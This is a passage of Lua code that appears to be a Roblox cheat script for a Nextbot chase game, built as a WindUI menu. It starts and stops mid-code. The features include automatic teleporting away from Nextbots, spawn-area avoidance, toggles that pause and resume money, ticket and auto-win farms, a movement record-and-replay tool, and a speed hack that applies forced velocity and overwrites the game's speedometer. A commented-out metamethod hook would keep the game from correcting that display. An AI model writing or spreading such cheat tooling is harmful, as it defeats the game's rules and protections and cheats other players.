    for _, nextbot in ipairs(nextbots) do
        local nextbotHrp = nextbot:FindFirstChild("HumanoidRootPart")
        if nextbotHrp then
            local distance = (humanoidRootPart.Position - nextbotHrp.Position).Magnitude
            if distance <= featureStates.AntiNextbotDistance then
                if featureStates.AntiNextbotTeleportType == "Players" then
                    local validPlayers = {}
                    for _, plr in ipairs(Players:GetPlayers()) do
                        if plr ~= player and plr.Character and plr.Character:FindFirstChild("HumanoidRootPart") then
                            table.insert(validPlayers, plr)
                        end
                    end
                    if #validPlayers > 0 then
                        local randomPlayer = validPlayers[math.random(1, #validPlayers)]
                        humanoidRootPart.CFrame = randomPlayer.Character.HumanoidRootPart.CFrame + Vector3.new(0, 3, 0)
                    end
                elseif featureStates.AntiNextbotTeleportType == "Spawn" then
                    local spawnsFolder = workspace:FindFirstChild("Game") and workspace.Game:FindFirstChild("Map") and workspace.Game.Map:FindFirstChild("Parts") and workspace.Game.Map.Parts:FindFirstChild("Spawns")
                    if spawnsFolder then
                        local spawnLocations = spawnsFolder:GetChildren()
                        if #spawnLocations > 0 then
                            local randomSpawn = spawnLocations[math.random(1, #spawnLocations)]
                            humanoidRootPart.CFrame = randomSpawn.CFrame + Vector3.new(0, 3, 0)
                        end
                    end
                elseif featureStates.AntiNextbotTeleportType == "Distance" then
                    local direction = (humanoidRootPart.Position - nextbotHrp.Position).Unit
                    local targetPos = humanoidRootPart.Position + direction * featureStates.DistanceTeleport

                    local path = PathfindingService:CreatePath({
                        AgentRadius = 2,
                        AgentHeight = 5,
                        AgentCanJump = true
                    })

                    local success, errorMessage = pcall(function()
                        path:ComputeAsync(humanoidRootPart.Position, targetPos)
                    end)

                    if success and path.Status == Enum.PathStatus.Success then
                        local waypoints = path:GetWaypoints()
                        if #waypoints > 1 then
                            local lastValidPos = waypoints[#waypoints].Position
                            local distanceToTarget = (lastValidPos - humanoidRootPart.Position).Magnitude
                            if distanceToTarget <= featureStates.DistanceTeleport then
                                humanoidRootPart.CFrame = CFrame.new(lastValidPos + Vector3.new(0, 3, 0))
                            else
                                for i = #waypoints, 1, -1 do
                                    local waypointPos = waypoints[i].Position
                                    if (waypointPos - humanoidRootPart.Position).Magnitude <= featureStates.DistanceTeleport then
                                        humanoidRootPart.CFrame = CFrame.new(waypointPos + Vector3.new(0, 3, 0))
                                        break
                                    end
                                end
                            end
                        end
                    else
                        local fallbackPos = humanoidRootPart.Position + direction * featureStates.DistanceTeleport
                        local ray = Ray.new(humanoidRootPart.Position, direction * featureStates.DistanceTeleport)
                        local hit, hitPos = workspace:FindPartOnRayWithIgnoreList(ray, {character, nextbot})
                        if not hit then
                            humanoidRootPart.CFrame = CFrame.new(fallbackPos + Vector3.new(0, 3, 0))
                        else
                            humanoidRootPart.CFrame = CFrame.new(hitPos + Vector3.new(0, 3, 0))
                        end
                    end
                end
                break
            end
        end
    end
end

task.spawn(function()
    while true do
        if featureStates.AntiNextbot then
            pcall(handleAntiNextbot)
        end
        task.wait(0.1)
    end
end)


 AntiNextbotToggle = Tabs.Main:Toggle({
    Title = "Anti-Nextbot",
    Flag = "AntiNextbotToggle",
    Desc = "Automatically teleport away from nearby Nextbots (farms pause if too close)",
    Icon = "shield",
    Value = featureStates.AntiNextbot,
    Callback = function(state)
        featureStates.AntiNextbot = state
        
        if state then
            antiNextbotConnection = game:GetService("RunService").Heartbeat:Connect(function()
                if not featureStates.AntiNextbot then return end
                
                local character = player.Character
                local humanoidRootPart = character and character:FindFirstChild("HumanoidRootPart")
                if not humanoidRootPart then return end
                local nearestDistance = math.huge
                local nearestNextbot = nil
                local playersFolder = workspace:FindFirstChild("Game") and workspace.Game:FindFirstChild("Players")
                local npcsFolder = workspace:FindFirstChild("NPCs")
                
                if playersFolder then
                    for _, model in pairs(playersFolder:GetChildren()) do
                        if model:IsA("Model") and model:FindFirstChild("HumanoidRootPart") and isNextbotModel(model) then
                            local dist = (model.HumanoidRootPart.Position - humanoidRootPart.Position).Magnitude
                            if dist < nearestDistance then
                                nearestDistance = dist
                                nearestNextbot = model
                            end
                        end
                    end
                end
                
                if npcsFolder then
                    for _, model in pairs(npcsFolder:GetChildren()) do
                        if model:IsA("Model") and model:FindFirstChild("HumanoidRootPart") and isNextbotModel(model) then
                            local dist = (model.HumanoidRootPart.Position - humanoidRootPart.Position).Magnitude
                            if dist < nearestDistance then
                                nearestDistance = dist
                                nearestNextbot = model
                            end
                        end
                    end
                end
                
                local threshold = featureStates.AntiNextbotDistance
                local isTooClose = (nearestDistance < threshold)
                
                if isTooClose and not farmsSuppressedByAntiNextbot then
                    previousMoneyFarm = getgenv().moneyfarm
                    previousTicketFarm = getgenv().ticketfarm
                    previousAutoWin = getgenv().autowin
                    
                    getgenv().moneyfarm = false
                    getgenv().ticketfarm = false
                    getgenv().autowin = false
                    
                    stopAutoMoneyFarm()
                    stopAutoWin()
                    
                    if AutoMoneyFarmToggle and AutoMoneyFarmToggle.Set then AutoMoneyFarmToggle:Set(false) end
                    if AutoTicketFarmToggle and AutoTicketFarmToggle.Set then AutoTicketFarmToggle:Set(false) end
                    if AutoWinToggle and AutoWinToggle.Set then AutoWinToggle:Set(false) end
                    
                    farmsSuppressedByAntiNextbot = true
                elseif not isTooClose and farmsSuppressedByAntiNextbot then
                    getgenv().moneyfarm = previousMoneyFarm
                    getgenv().ticketfarm = previousTicketFarm
                    getgenv().autowin = previousAutoWin
                    
                    if previousMoneyFarm then
                        startAutoMoneyFarm()
                        if AutoMoneyFarmToggle and AutoMoneyFarmToggle.Set then AutoMoneyFarmToggle:Set(true) end
                    end
                    if previousTicketFarm then
                        if AutoTicketFarmToggle and AutoTicketFarmToggle.Set then AutoTicketFarmToggle:Set(true) end
                    end
                    if previousAutoWin then
                        startAutoWin()
                        if AutoWinToggle and AutoWinToggle.Set then AutoWinToggle:Set(true) end
                    end
                    
                    farmsSuppressedByAntiNextbot = false
                end
                
                if isTooClose then
                    local safePart = workspace:FindFirstChild("SecurityPart")
                    if safePart then
                        humanoidRootPart.CFrame = safePart.CFrame + Vector3.new(math.random(-5, 5), 3, math.random(-5, 5))
                    end
                end
            end)
        else
            if antiNextbotConnection then
                antiNextbotConnection:Disconnect()
                antiNextbotConnection = nil
            end
            if farmsSuppressedByAntiNextbot then
                getgenv().moneyfarm = previousMoneyFarm
                getgenv().ticketfarm = previousTicketFarm
                getgenv().autowin = previousAutoWin
                
                if previousMoneyFarm then
                    startAutoMoneyFarm()
                    if AutoMoneyFarmToggle and AutoMoneyFarmToggle.Set then AutoMoneyFarmToggle:Set(true) end
                end
                if previousTicketFarm then
                    if AutoTicketFarmToggle and AutoTicketFarmToggle.Set then AutoTicketFarmToggle:Set(true) end
                end
                if previousAutoWin then
                    startAutoWin()
                    if AutoWinToggle and AutoWinToggle.Set then AutoWinToggle:Set(true) end
                end
                
                farmsSuppressedByAntiNextbot = false
            end
        end
    end
})

 AntiNextbotTeleportTypeDropdown = Tabs.Main:Dropdown({
    Title = "Anti-Nextbot Teleport Type",
    Flag = "AntiNextbotTeleportTypeDropdown",
    Desc = "Choose how to teleport when avoiding Nextbots",
    Values = {"Players", "Spawn", "Distance"},
    Value = featureStates.AntiNextbotTeleportType,
    Callback = function(value)
        featureStates.AntiNextbotTeleportType = value
    end
})

 AntiNextbotDistanceInput = Tabs.Main:Input({
    Title = "Anti-Nextbot Distance",
    Flag = "AntiNextbotDistanceInput",
    Desc = "Distance threshold for Nextbot detection",
    Placeholder = tostring(featureStates.AntiNextbotDistance),
    NumbersOnly = true,
    Value = tostring(featureStates.AntiNextbotDistance),
    Callback = function(value)
        local num = tonumber(value)
        if num and num > 0 then
            featureStates.AntiNextbotDistance = num
        end
    end
})
 DistanceTeleportInput = Tabs.Main:Input({
    Title = "Distance Teleport",
    Flag = "DistanceTeleportInput",
    Desc = "How far to teleport when using Distance mode",
    Placeholder = tostring(featureStates.DistanceTeleport),
    NumbersOnly = true,
    Callback = function(value)
        local num = tonumber(value)
        if num and num > 0 then
            featureStates.DistanceTeleport = num
        end
    end
})

featureStates.AntiNextbotSpawn = false
featureStates.AntiNextbotSpawnType = "Spawn"
featureStates.AntiNextbotSpawnDistance = 40
featureStates.AntiNextbotTeleportDistance = 20

local cachedAttachment = nil
local lastAttachmentCheck = 0
local attachmentCheckCooldown = 5
local isSearchingForAttachment = false

local function getAttachment()
    if tick() - lastAttachmentCheck > attachmentCheckCooldown then
        cachedAttachment = workspace.Terrain:FindFirstChild("NextbotSpawnAttachment")
        lastAttachmentCheck = tick()
    end
    return cachedAttachment
end

local function startAttachmentSearch()
    if isSearchingForAttachment then return end
    isSearchingForAttachment = true
    
    task.spawn(function()
        while featureStates.AntiNextbotSpawn and not getAttachment() do
            task.wait(3)
            
            local statsFolder = workspace:FindFirstChild("Game") and workspace.Game:FindFirstChild("Stats")
            if statsFolder then
                local timerValue = statsFolder:GetAttribute("Timer")
                if timerValue == 0 then
                    cachedAttachment = workspace.Terrain:FindFirstChild("NextbotSpawnAttachment")
                    lastAttachmentCheck = tick()
                    if cachedAttachment then
                        WindUI:Notify({
                            Title = "Anti Nextbot Spawn",
                            Content = "Attachment found! System now active.",
                            Duration = 3
                        })
                        break
                    end
                end
            end
        end
        isSearchingForAttachment = false
    end)
end

local function fastDistanceSquared(pos1, pos2)
    local dx = pos1.X - pos2.X
    local dy = pos1.Y - pos2.Y
    local dz = pos1.Z - pos2.Z
    return dx*dx + dy*dy + dz*dz
end

local function findSafeTeleportPositionReverse(startPos, targetPos)
    local raycastParams = RaycastParams.new()
    raycastParams.FilterType = Enum.RaycastFilterType.Blacklist
    raycastParams.FilterDescendantsInstances = {player.Character}
    
    local direction = (targetPos - startPos).Unit
    local maxDistance = (targetPos - startPos).Magnitude
    
    for distance = maxDistance, 0, -5 do
        local testPos = startPos + (direction * distance)
        
        local downRay = workspace:Raycast(testPos + Vector3.new(0, 10, 0), Vector3.new(0, -20, 0), raycastParams)
        if downRay then
            local groundPos = downRay.Position + Vector3.new(0, 3, 0)
            
            local upRay = workspace:Raycast(groundPos, Vector3.new(0, 6, 0), raycastParams)
            if not upRay then
                local sideRays = {
                    Vector3.new(3, 0, 0),
                    Vector3.new(-3, 0, 0),
                    Vector3.new(0, 0, 3),
                    Vector3.new(0, 0, -3)
                }
                
                local isSafe = true
                for _, sideDir in ipairs(sideRays) do
                    local sideRay = workspace:Raycast(groundPos, sideDir, raycastParams)
                    if sideRay and sideRay.Instance.CanCollide then
                        isSafe = false
                        break
                    end
                end
                
                if isSafe then
                    return groundPos
                end
            end
        end
    end
    
    return nil
end

local function teleportToSpawn()
    local spawnsFolder = workspace:FindFirstChild("Game") and workspace.Game:FindFirstChild("Map") and workspace.Game.Map:FindFirstChild("Parts") and workspace.Game.Map.Parts:FindFirstChild("Spawns")
    
    if spawnsFolder then
        local spawnLocations = spawnsFolder:GetChildren()
        if #spawnLocations > 0 then
            local character = player.Character
            local humanoidRootPart = character and character:FindFirstChild("HumanoidRootPart")
            
            if humanoidRootPart then
                for i = 1, math.min(3, #spawnLocations) do
                    local randomSpawn = spawnLocations[math.random(1, #spawnLocations)]
                    local targetPosition = randomSpawn.CFrame.Position + Vector3.new(0, 3, 0)
                    
                    local safePosition = findSafeTeleportPositionReverse(humanoidRootPart.Position, targetPosition)
                    if safePosition then
                        humanoidRootPart.CFrame = CFrame.new(safePosition)
                        return true
                    end
                end
            end
        end
    end
    return false
end

local function teleportToPlayer()
    local players = Players:GetPlayers()
    local validPlayers = {}
    
    for _, plr in ipairs(players) do
        if plr ~= player and plr.Character and plr.Character:FindFirstChild("HumanoidRootPart") then
            table.insert(validPlayers, plr)
        end
    end
    
    if #validPlayers > 0 then
        local character = player.Character
        local humanoidRootPart = character and character:FindFirstChild("HumanoidRootPart")
        
        if humanoidRootPart then
            for i = 1, math.min(3, #validPlayers) do
                local randomPlayer = validPlayers[math.random(1, #validPlayers)]
                local targetPosition = randomPlayer.Character.HumanoidRootPart.Position + Vector3.new(0, 3, 0)
                
                local safePosition = findSafeTeleportPositionReverse(humanoidRootPart.Position, targetPosition)
                if safePosition then
                    humanoidRootPart.CFrame = CFrame.new(safePosition)
                    return true
                end
            end
        end
    end
    return false
end

local function teleportToDistance()
    local attachment = getAttachment()
    local character = player.Character
    local humanoidRootPart = character and character:FindFirstChild("HumanoidRootPart")
    if not humanoidRootPart then return false end
    
    if attachment then
        local direction = (humanoidRootPart.Position - attachment.WorldPosition).Unit
        local targetPos = humanoidRootPart.Position + direction * featureStates.AntiNextbotTeleportDistance
        
        local safePosition = findSafeTeleportPositionReverse(humanoidRootPart.Position, targetPos)
        if safePosition then
            humanoidRootPart.CFrame = CFrame.new(safePosition)
            return true
        else
            return teleportToSpawn()
        end
    else
        return teleportToSpawn()
    end
end

local function isPlayerNearSpawn()
    local attachment = getAttachment()
    if not attachment or not player.Character then return false end
    
    local humanoidRootPart = player.Character:FindFirstChild("HumanoidRootPart")
    if not humanoidRootPart then return false end
    
    local distanceSquared = fastDistanceSquared(humanoidRootPart.Position, attachment.WorldPosition)
    local triggerDistanceSquared = featureStates.AntiNextbotSpawnDistance * featureStates.AntiNextbotSpawnDistance
    
    return distanceSquared <= triggerDistanceSquared
end

local function performAvoidance()
    if not player.Character then return end
    
    local success = false
    
    if featureStates.AntiNextbotSpawnType == "Spawn" then
        success = teleportToSpawn()
    elseif featureStates.AntiNextbotSpawnType == "Player" then
        success = teleportToPlayer()
    else
        success = teleportToDistance()
    end
    
    if not success then
        WindUI:Notify({
            Title = "Anti Nextbot Spawn",
            Content = "No safe teleport location found!",
            Duration = 2
        })
    end
end

local nextbotSpawnConnection = nil
local lastAvoidanceTime = 0
local avoidanceCooldown = 2

local function startAntiNextbot()
    if nextbotSpawnConnection then
        nextbotSpawnConnection:Disconnect()
    end
    
    nextbotSpawnConnection = RunService.Heartbeat:Connect(function()
        if not featureStates.AntiNextbotSpawn or not player.Character then return end
        
        if tick() - lastAvoidanceTime < avoidanceCooldown then return end
        
        local attachment = getAttachment()
        if not attachment then
            return
        end
        
        if isPlayerNearSpawn() then
            performAvoidance()
            lastAvoidanceTime = tick()
        end
    end)
end

local function restartSystemOnEvents()
    player.CharacterAdded:Connect(function()
        if featureStates.AntiNextbotSpawn then
            task.wait(1)
            if not nextbotSpawnConnection then
                startAntiNextbot()
            end
        end
    end)
    
    local statsFolder = workspace:FindFirstChild("Game") and workspace.Game:FindFirstChild("Stats")
    if statsFolder then
        statsFolder:GetAttributeChangedSignal("Timer"):Connect(function()
            if featureStates.AntiNextbotSpawn then
                local timerValue = statsFolder:GetAttribute("Timer")
                if timerValue == 0 then
                    cachedAttachment = workspace.Terrain:FindFirstChild("NextbotSpawnAttachment")
                    lastAttachmentCheck = tick()
                    
                    if not nextbotSpawnConnection then
                        task.wait(1)
                        startAntiNextbot()
                    end
                end
            end
        end)
    end
end

AntiNextbotSpawnToggle = Tabs.Main:Toggle({
    Title = "Anti Nextbot Spawn",
    Flag = "AntiNextbotSpawnToggle",
    Desc = "Automatically avoid Nextbot spawn areas",
    Value = false,
    Callback = function(state)
        featureStates.AntiNextbotSpawn = state
        
        if state then
            startAntiNextbot()
            startAttachmentSearch()
            
            if not getAttachment() then
                WindUI:Notify({
                    Title = "Anti Nextbot Spawn",
                    Content = "System enabled - Searching for attachment...",
                    Duration = 3
                })
            else
                WindUI:Notify({
                    Title = "Anti Nextbot Spawn",
                    Content = "System enabled - Attachment found!",
                    Duration = 3
                })
            end
        else
            if nextbotSpawnConnection then
                nextbotSpawnConnection:Disconnect()
                nextbotSpawnConnection = nil
            end
            isSearchingForAttachment = false
        end
    end
})

AntiNextbotSpawnTypeDropdown = Tabs.Main:Dropdown({
    Title = "Avoidance Mode",
    Flag = "AntiNextbotSpawnTypeDropdown",
    Desc = "Choose how to avoid Nextbot spawn",
    Values = {"Spawn", "Player", "Distance"},
    Value = "Spawn",
    Callback = function(value)
        featureStates.AntiNextbotSpawnType = value
    end
})

AntiNextbotSpawnDistanceInput = Tabs.Main:Input({
    Title = "Avoidance Distance",
    Flag = "AntiNextbotSpawnDistanceInput",
    Desc = "Distance to trigger avoidance (studs)",
    Placeholder = "40",
    NumbersOnly = true,
    Callback = function(value)
        local distance = tonumber(value)
        if distance and distance > 0 then
            featureStates.AntiNextbotSpawnDistance = distance
        end
    end
})

AntiNextbotTeleportDistanceInput = Tabs.Main:Input({
    Title = "Teleport Distance",
    Flag = "AntiNextbotTeleportDistanceInput",
    Desc = "How far to teleport in Distance mode (studs)",
    Placeholder = "20",
    NumbersOnly = true,
    Callback = function(value)
        local distance = tonumber(value)
        if distance and distance > 0 then
            featureStates.AntiNextbotTeleportDistance = distance
        end
    end
})

task.spawn(function()
    while true do
        task.wait(attachmentCheckCooldown)
        
        if featureStates.AntiNextbotSpawn then
            local currentAttachment = workspace.Terrain:FindFirstChild("NextbotSpawnAttachment")
            
            if currentAttachment and not cachedAttachment then
                cachedAttachment = currentAttachment
                WindUI:Notify({
                    Title = "Anti Nextbot Spawn",
                    Content = "Attachment found! System now active.",
                    Duration = 3
                })
            elseif not currentAttachment and cachedAttachment then
                cachedAttachment = nil
                WindUI:Notify({
                    Title = "Anti Nextbot Spawn",
                    Content = "Attachment lost - System will reactivate when found.",
                    Duration = 3
                })
            else
                cachedAttachment = currentAttachment
            end
        end
    end
end)

restartSystemOnEvents()

local isMobile = UserInputService.TouchEnabled and not UserInputService.KeyboardEnabled

Tabs.Main:Section({ Title = "Emote Crouch", TextSize = 20 })
Tabs.Main:Divider()

math.randomseed(tick())

local emoteInputs = {}
for i = 1, 12 do
    emoteInputs[i] = Tabs.Main:Input({
        Title = "Emote " .. i,
        Placeholder = "Emote Name Here",
        Callback = function(value)
            featureStates["Emote" .. i] = value
        end
    })
end

local emoteGui = nil
local emoteGuiButton = nil
local emoteInputConnection = nil
local emoteGuiVisible = false

local function makeDraggable(frame)
    frame.Active = true
    frame.Draggable = true
    pcall(function()
        local dragDetector = Instance.new("UIDragDetector")
        dragDetector.Parent = frame
    end)
    local originalBackground = frame.BackgroundColor3
    local originalTransparency = frame.BackgroundTransparency
    frame.InputBegan:Connect(function(input)
        if input.UserInputType == Enum.UserInputType.MouseButton1 or input.UserInputType == Enum.UserInputType.Touch then
            frame.BackgroundTransparency = originalTransparency - 0.1
        end
    end)
    frame.InputEnded:Connect(function(input)
        if input.UserInputType == Enum.UserInputType.MouseButton1 or input.UserInputType == Enum.UserInputType.Touch then
            frame.BackgroundTransparency = originalTransparency
        end
    end)
end

local function triggerRandomEmote()
    local validEmotes = {}
    for i = 1, 12 do
        local emoteName = featureStates["Emote" .. i]
        if emoteName and emoteName ~= "" then
            table.insert(validEmotes, emoteName)
        end
    end
    
    if #validEmotes > 0 then
        math.randomseed(tick() + #validEmotes)
        
        local ohTable1 = { ["Key"] = "Crouch", ["Down"] = true }
        pcall(function()
            player.PlayerScripts.Events.temporary_events.UseKeybind:Fire(ohTable1)
        end)
        local randomIndex = math.random(1, #validEmotes)
        local randomEmote = validEmotes[randomIndex]
        pcall(function()
            ReplicatedStorage.Events.Character.Emote:FireServer(randomEmote)
        end)
    end
end

local function createEmoteGui(yOffset)
    local emoteGuiOld = playerGui:FindFirstChild("EmoteGui")
    if emoteGuiOld then emoteGuiOld:Destroy() end
    emoteGui = Instance.new("ScreenGui")
    emoteGui.Name = "EmoteGui"
    emoteGui.IgnoreGuiInset = true
    emoteGui.ResetOnSpawn = false
    emoteGui.Enabled = emoteGuiVisible and isMobile
    emoteGui.Parent = playerGui
    local frame = Instance.new("Frame")
    frame.Size = UDim2.new(0, 60, 0, 60)
    frame.Position = UDim2.new(0.5, -30, 0.12 + (yOffset or 0), 0)
    frame.BackgroundColor3 = Color3.fromRGB(0, 0, 0)
    frame.BackgroundTransparency = 0.35
    frame.BorderSizePixel = 0
    frame.Parent = emoteGui
    makeDraggable(frame)
    local corner = Instance.new("UICorner")
    corner.CornerRadius = UDim.new(0, 6)
    corner.Parent = frame
    local stroke = Instance.new("UIStroke")
    stroke.Color = Color3.fromRGB(150, 150, 150)
    stroke.Thickness = 2
    stroke.Parent = frame
    local label = Instance.new("TextLabel")
    label.Text = "Emote Crouch"
    label.Size = UDim2.new(0.9, 0, 0.5, 0)
    label.Position = UDim2.new(0.05, 0, 0, 0)
    label.BackgroundTransparency = 1
    label.TextColor3 = Color3.fromRGB(255, 255, 255)
    label.Font = Enum.Font.Roboto
    label.TextSize = 16
    label.TextXAlignment = Enum.TextXAlignment.Center
    label.TextYAlignment = Enum.TextYAlignment.Center
    label.TextScaled = true
    label.Parent = frame
    emoteGuiButton = Instance.new("TextButton")
    emoteGuiButton.Name = "TriggerButton"
    emoteGuiButton.Text = "Start"
    emoteGuiButton.Size = UDim2.new(0.9, 0, 0.5, 0)
    emoteGuiButton.Position = UDim2.new(0.05, 0, 0.5, 0)
    emoteGuiButton.BackgroundColor3 = Color3.fromRGB(0, 120, 80)
    emoteGuiButton.TextColor3 = Color3.fromRGB(255, 255, 255)
    emoteGuiButton.Font = Enum.Font.Roboto
    emoteGuiButton.TextSize = 14
    emoteGuiButton.TextXAlignment = Enum.TextXAlignment.Center
    emoteGuiButton.TextYAlignment = Enum.TextYAlignment.Center
    emoteGuiButton.TextScaled = true
    emoteGuiButton.Parent = frame
    local buttonCorner = Instance.new("UICorner")
    buttonCorner.CornerRadius = UDim.new(0, 4)
    buttonCorner.Parent = emoteGuiButton
    emoteGuiButton.MouseButton1Click:Connect(function()
        triggerRandomEmote()
    end)
end

EmoteGUIToggle = Tabs.Main:Toggle({
    Title = "Emote Crouch",
    Flag = "EmoteGUIToggle",
    Desc = "Press J keybind if you have keyboard, Only type emote name without space and inside your emote slot will work",
    Value = false,
    Callback = function(state)
        emoteGuiVisible = state
        if state then
            if emoteInputConnection then
                emoteInputConnection:Disconnect()
            end
            spawn(function()
                emoteInputConnection = UserInputService.InputBegan:Connect(function(input, gameProcessed)
                    if gameProcessed then return end
                    if input.KeyCode == Enum.KeyCode.J then
                        triggerRandomEmote()
                    end
                end)
            end)
            
            if isMobile and not emoteGui then
                createEmoteGui(0)
            elseif emoteGui then
                emoteGui.Enabled = isMobile
            end
        else
            if emoteGui then
                emoteGui:Destroy()
                emoteGui = nil
                emoteGuiButton = nil
            end
            if emoteInputConnection then
                emoteInputConnection:Disconnect()
                emoteInputConnection = nil
            end
        end
    end
})

player.CharacterAdded:Connect(function()
    if emoteGuiVisible and isMobile and not emoteGui then
        createEmoteGui(0)
    end
end)
Tabs.Main:Section({ Title = "TAS", TextSize = 20 })
Tabs.Main:Divider()
Running = false
Frames = {}
TimeStart = tick()

Player = game:GetService("Players").LocalPlayer
getChar = function()
    Character = Player.Character
    if Character then
        return Character
    else
        Player.CharacterAdded:Wait()
        return getChar()
    end
end

StartRecord = function()
    Frames = {}
    Running = true
    TimeStart = tick()
    while Running == true do
        game:GetService("RunService").Heartbeat:wait()
        Character = getChar()
        table.insert(Frames, {
            Character.HumanoidRootPart.CFrame,
            Character.Humanoid:GetState().Value,
            tick() - TimeStart
        })
    end
end

StopRecord = function()
    Running = false
end

PlayTAS = function()
    Character = getChar()
    TimePlay = tick()
    FrameCount = #Frames
    OldFrame = 1
    TASLoop = game:GetService("RunService").Heartbeat:Connect(function()
        CurrentTime = tick()
        if (CurrentTime - TimePlay) >= Frames[FrameCount][3] then
            TASLoop:Disconnect()
            return
        end
        for i = OldFrame, math.min(OldFrame + 60, FrameCount) do
            Frame = Frames[i]
            if Frame and Frame[3] <= (CurrentTime - TimePlay) then
                OldFrame = i
                Character.HumanoidRootPart.CFrame = Frame[1]
                Character.Humanoid:ChangeState(Frame[2])
            end
        end
    end)
end



Tabs.Main:Button({ Title = "Start recording", Color = Color3.fromHex("#30FF6A"), Callback = StartRecord })
Tabs.Main:Button({ Title = "Stop recording",  Color = Color3.fromHex("#ff4830"), Callback = StopRecord })
Tabs.Main:Button({ Title = "Play",            Color = Color3.fromHex("#30FF6A"), Callback = PlayTAS })
   -- Player Tabs
   Tabs.Player:Section({ Title = "Player", TextSize = 40 })
    Tabs.Player:Divider()
getgenv().EasyTrimp = {
    Enabled = false,
    ToggleKey = Enum.KeyCode.U,
    BaseSpeed = 50,
    ExtraSpeed = 100,
    FloorDrop = 0
}

extra = getgenv().EasyTrimp.ExtraSpeed
floorDrop = getgenv().EasyTrimp.FloorDrop
last = tick()
airTick = 0
airSum = 0
airborne = false
push = nil
speed = getgenv().EasyTrimp.BaseSpeed
allow = false

Player = game.Players.LocalPlayer
RunService = game:GetService("RunService")
UserInputService = game:GetService("UserInputService")
Debris = game:GetService("Debris")
camera = workspace.CurrentCamera

function cut(n)
    return math.floor(n*10)/10
end

function meter()
    ok, v = pcall(function()
        return Player.PlayerGui.Shared.HUD.Overlay.Default.CharacterInfo.Item.Speedometer.Players
    end)
    if ok then return v end
end
--[[
old = hookmetamethod(game, "__newindex", function(a, b, c)
    if not checkcaller() and allow and meter() and a == meter() and b == "Text" then
        return
    end
    return old(a, b, c)
end)
]]
RunService.RenderStepped:Connect(function()
    dt = tick() - last
    last = tick()

    ch = Player.Character
    if not ch then return end

    hrp = ch:FindFirstChild("HumanoidRootPart")
    hum = ch:FindFirstChild("Humanoid")
    if not hrp or not hum then return end

    spd = meter()
    inAir = hum.FloorMaterial == Enum.Material.Air

    if airborne and not inAir then
        speed = math.max(getgenv().EasyTrimp.BaseSpeed - floorDrop, speed - 10)
        if spd then spd.Text = cut(speed) end
        airSum = 0
    end
    airborne = inAir

    if getgenv().EasyTrimp.Enabled then
        if inAir then
            airSum += dt
            airTick += dt
            while airTick >= 0.04 do
                airTick -= 0.04
                add = math.max(0.1, 2.5 * (0.04 / 1))
                speed = math.min(getgenv().EasyTrimp.BaseSpeed + extra, speed + add)
            end
        else
            airTick = 0
            airSum = 0
            speed = math.max(getgenv().EasyTrimp.BaseSpeed - floorDrop, speed - (2.5 * dt))
        end

        if push then push:Destroy() end

        look = camera.CFrame.LookVector
        moveDir = Vector3.new(look.X, 0, look.Z)
        if moveDir.Magnitude > 0 then moveDir = moveDir.Unit end

        bv = Instance.new("BodyVelocity")
        bv.Velocity = moveDir * speed
        bv.MaxForce = Vector3.new(4e5, 0, 4e5)
        bv.P = 1250
        bv.Parent = hrp
        Debris:AddItem(bv, 0.1)
        push = bv

        allow = true
        if spd then spd.Text = cut(speed) end
    else
        if push then push:Destroy() push = nil end
        speed = getgenv().EasyTrimp.BaseSpeed
        allow = false
        airTick = 0
        airSum = 0
        airborne = false
    end
end)

function createEasyTrimpGui(yOffset)
    easyTrimpGuiOld = playerGui:FindFirstChild("EasyTrimpGui")
    if easyTrimpGuiOld then
        easyTrimpGuiOld:Destroy()
    end
    
    easyTrimpGui = Instance.new("ScreenGui")
    easyTrimpGui.Name = "EasyTrimpGui"
    easyTrimpGui.IgnoreGuiInset = true
    easyTrimpGui.ResetOnSpawn = false
    easyTrimpGui.Enabled = featureStates.EasyTrimpGuiVisible
    easyTrimpGui.Parent = playerGui

    frame = Instance.new("Frame")
    frame.Size = UDim2.new(0, 60, 0, 60)
    frame.Position = UDim2.new(0.5, -30, 0.12 + (yOffset or 0), 0)
    frame.BackgroundColor3 = Color3.fromRGB(0, 0, 0)
    frame.BackgroundTransparency = 0.35
    frame.BorderSizePixel = 0
    frame.Parent = easyTrimpGui
    makeDraggable(frame)

    corner = Instance.new("UICorner")
    corner.CornerRadius = UDim.new(0, 6)
    corner.Parent = frame

    stroke = Instance.new("UIStroke")
    stroke.Color = Color3.fromRGB(150, 150, 150)
    stroke.Thickness = 2
    stroke.Parent = frame

    label = Instance.new("TextLabel")
    label.Text = "Easy"
    label.Size = UDim2.new(0.9, 0, 0.3, 0)
    label.Position = UDim2.new(0.05, 0, 0.05, 0)
    label.BackgroundTransparency = 1
    label.TextColor3 = Color3.fromRGB(255, 255, 255)
    label.Font = Enum.Font.Roboto
    label.TextSize = 14
    label.TextXAlignment = Enum.TextXAlignment.Center
    label.TextYAlignment = Enum.TextYAlignment.Center
    label.TextScaled = true
    label.Parent = frame

    subLabel = Instance.new("TextLabel")
    subLabel.Text = "Trimp"
    subLabel.Size = UDim2.new(0.9, 0, 0.3, 0)
    subLabel.Position = UDim2.new(0.05, 0, 0.3, 0)
    subLabel.BackgroundTransparency = 1
    subLabel.TextColor3 = Color3.fromRGB(255, 255, 255)
    subLabel.Font = Enum.Font.Roboto
    subLabel.TextSize = 14
    subLabel.TextXAlignment = Enum.TextXAlignment.Center
    subLabel.TextYAlignment = Enum.TextYAlignment.Center
    subLabel.TextScaled = true
    subLabel.Parent = frame

    easyTrimpGuiButton = Instance.new("TextButton")
    easyTrimpGuiButton.Name = "ToggleButton"
    easyTrimpGuiButton.Text = getgenv().EasyTrimp.Enabled and "On" or "Off"
    easyTrimpGuiButton.Size = UDim2.new(0.9, 0, 0.35, 0)
    easyTrimpGuiButton.Position = UDim2.new(0.05, 0, 0.6, 0)
    easyTrimpGuiButton.BackgroundColor3 = getgenv().EasyTrimp.Enabled and Color3.fromRGB(0, 120, 80) or Color3.fromRGB(120, 0, 0)
    easyTrimpGuiButton.TextColor3 = Color3.fromRGB(255, 255, 255)
    easyTrimpGuiButton.Font = Enum.Font.Roboto
    easyTrimpGuiButton.TextSize = 12
    easyTrimpGuiButton.TextXAlignment = Enum.TextXAlignment.Center
    easyTrimpGuiButton.TextYAlignment = Enum.TextYAlignment.Center
    easyTrimpGuiButton.TextScaled = true
    easyTrimpGuiButton.Parent = frame

    buttonCorner = Instance.new("UICorner")
    buttonCorner.CornerRadius = UDim.new(0, 4)
    buttonCorner.Parent = easyTrimpGuiButton

    easyTrimpGuiButton.MouseButton1Click:Connect(function()
        getgenv().EasyTrimp.Enabled = not getgenv().EasyTrimp.Enabled
        
        if EasyTrimpToggle then
